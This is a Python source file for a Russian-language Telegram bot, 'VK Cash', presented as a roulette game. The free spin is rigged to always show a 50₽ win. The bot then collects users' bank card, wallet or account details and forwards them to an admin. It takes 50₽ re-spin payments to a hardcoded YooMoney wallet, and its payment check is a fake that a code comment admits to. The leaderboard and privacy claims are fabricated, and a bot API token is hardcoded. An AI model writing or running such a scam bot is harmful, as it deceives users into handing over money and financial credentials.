import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import time
import random
import json
import os

API_TOKEN = '8135081615:AAFHaG7cgRaNlBAAEk_ALEP0-wHYzOniYbU'
ADMIN_ID = 6180147473
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

user_states = {}
first_spin_done = {}
payment_ready = {}

CODES_FILE = "codes.json"
VKCOIN_FILE = "vkcoins.json"

if not os.path.exists(CODES_FILE):
    with open(CODES_FILE, "w") as f:
        json.dump({}, f)
if not os.path.exists(VKCOIN_FILE):
    with open(VKCOIN_FILE, "w") as f:
        json.dump({}, f)

def generate_code(amount, user_id):
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    code = f"CODE-{amount}-{timestamp}-{random_part}"
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    codes[code] = {
        "user_id": user_id,
        "amount": amount,
        "used": False
    }
    with open(CODES_FILE, "w") as f:
        json.dump(codes, f, indent=4)
    return code

def get_main_markup(user_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🎁 Крутить бесплатно", callback_data="free_spin"))
    markup.add(InlineKeyboardButton("💵 Оплатить повторную прокрутку 50₽", callback_data="pay50"))
    if payment_ready.get(user_id):
        markup.add(InlineKeyboardButton("✅ Я оплатил", callback_data="confirm_payment"))
    markup.add(InlineKeyboardButton("🛒 Магазин", callback_data="shop"),
               InlineKeyboardButton("🏆 Топ", callback_data="leaderboard"))
    markup.add(InlineKeyboardButton("📜 Правила", callback_data="rules"),
               InlineKeyboardButton("❓ FAQ", callback_data="faq"))
    markup.add(InlineKeyboardButton("📋 Политика", callback_data="policy"))
    if user_id == ADMIN_ID:
        markup.add(InlineKeyboardButton("👑 Админ-панель", callback_data="admin"))
    return markup

@bot.message_handler(commands=['start'])
def send_start(message):
    bot.send_message(message.chat.id, "🎰 Добро пожаловать в VK Cash!\nВыбирай действие ниже:", reply_markup=get_main_markup(message.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == "free_spin")
def handle_spin(call):
    uid = call.from_user.id
    if first_spin_done.get(uid):
        bot.answer_callback_query(call.id, "Бесплатная попытка уже использована.")
        return
    first_spin_done[uid] = True
    amount = 50
    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...\n[ 🎰 🎰 🎰 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍋 🍒 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍉 💰 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍒 ]")
    code = generate_code(amount, uid)
    user_states[uid] = {"amount": amount, "code": code}
    message_text = f"🎉 *ПОБЕДА {amount}₽!* 🎉\n🎫 Код: `{code}`\n\n💳 Отправьте свои реквизиты:\n— Номер карты (Сбербанк, Тинькофф)\n— Или кошелёк (ЮMoney, Payeer, PayPal)\n— Или банк + номер счёта"
    bot.send_message(call.message.chat.id, message_text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "pay50")
def handle_payment(call):
    uid = call.from_user.id
    payment_ready[uid] = True
    text = "💸 Оплата повторной прокрутки\n\nОтправьте 50₽ на ЮMoney:\n`4100119077541618`\nНазвание: *Плачу значит верчу*"
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=get_main_markup(uid))

@bot.callback_query_handler(func=lambda call: call.data == "confirm_payment")
def handle_confirm(call):
    uid = call.from_user.id
    if not payment_ready.get(uid):
        bot.answer_callback_query(call.id, "Вы ещё не оплатили через кнопку 50₽.")
        return
    # Простая фейковая проверка оплаты (можно заменить реальной)
    first_spin_done[uid] = False
    payment_ready[uid] = False
    bot.send_message(call.message.chat.id, "✅ Оплата подтверждена! Теперь вы можете снова крутить колесо.", reply_markup=get_main_markup(uid))

@bot.callback_query_handler(func=lambda call: call.data == "shop")
def handle_shop(call):
    bot.send_message(call.message.chat.id, "🛍 Скоро вы сможете тратить VKC на:\n– Бусты удачи\n– Аватары и ранги\n– Подарки друзьям\n– Ивенты и конкурсы\n– Вывод в бонусном режиме\n– VIP-доступ")

@bot.callback_query_handler(func=lambda call: call.data == "leaderboard")
def handle_leaderboard(call):
    bot.send_message(call.message.chat.id, "⚡ ТОП-5 участников за 24ч:\n1. @username1 — 250₽\n2. @username2 — 200₽\n3. @username3 — 150₽\n4. @username4 — 100₽\n5. @username5 — 50₽\n\nИграй и попади в список! Обновление ежедневно.")

@bot.callback_query_handler(func=lambda call: call.data == "rules")
def handle_rules(call):
    text = "📜 *Правила:*\n1. Бесплатная прокрутка — 1 раз.\n2. Выигрыш по коду.\n3. Мошенничество — бан.\n4. Повтор — после оплаты.\n5. Один аккаунт на человека.\n6. Уважаем честную игру."
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "faq")
def handle_faq(call):
    text = "❓ *FAQ:*\n– VKC — рулетка с шансами.\n– Старт — кнопка 'Крутить бесплатно'.\n– Повтор — только после оплаты.\n– Ввод реквизитов — после выигрыша.\n– Кто может? Любой с кошельком.\n– Частота — 1 раз бесплатно, дальше платно."
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "policy")
def handle_policy(call):
    text = "📋 *Политика:*\n1. Храним только ID и коды.\n2. Информация — анонимна.\n3. Реквизиты — только для выплат.\n4. Доступа к Telegram нет.\n5. Развлекательный проект.\n6. Согласие — при использовании."
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin")
def handle_admin(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Нет доступа.")
        return
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📬 Просмотр заявок", callback_data="admin_requests"))
    markup.add(InlineKeyboardButton("🔍 Проверка кодов", callback_data="admin_check"))
    markup.add(InlineKeyboardButton("📜 История побед", callback_data="admin_history"))
    markup.add(InlineKeyboardButton("🔓 Разблокировка", callback_data="admin_unlock"))
    markup.add(InlineKeyboardButton("🎁 Бонусы вручную", callback_data="admin_bonus"))
    markup.add(InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"))
    bot.send_message(call.message.chat.id, "👑 Админ-панель:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    uid = message.from_user.id
    if uid in user_states:
        state = user_states.pop(uid)
        code = state["code"]
        with open(CODES_FILE, "r") as f:
            codes = json.load(f)
        if code not in codes:
            bot.send_message(uid, "❌ Код не найден.")
            return
        if codes[code]["used"]:
            bot.send_message(uid, "⚠️ Код уже использован.")
            return
        if codes[code]["user_id"] != uid:
            bot.send_message(uid, "⛔ Не ваш код.")
            return
        payout_info = (
            f"💰 Заявка от @{message.from_user.username or message.from_user.first_name}:\n"
            f"🆔 ID: {uid}\n"
            f"🔐 Код: {code}\n"
            f"📦 Сумма: {state['amount']}₽\n"
            f"💳 Реквизиты: {message.text}"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💸 Выплатить", url="https://yoomoney.ru/main"))
        bot.send_message(ADMIN_ID, payout_info, reply_markup=markup)
        bot.send_message(uid, "✅ Заявка принята. Ожидайте выплату!")

@app.route('/', methods=['GET', 'POST'])
def webhook():
    if request.method == 'POST':
        update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
        bot.process_new_updates([update])
        return "OK", 200
    return "VK Cash бот работает!", 200

if __name__ == '__main__':
    WEBHOOK_URL = "https://vk-cash-bot.onrender.com"
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=WEBHOOK_URL)
    app.run(host='0.0.0.0', port=8080)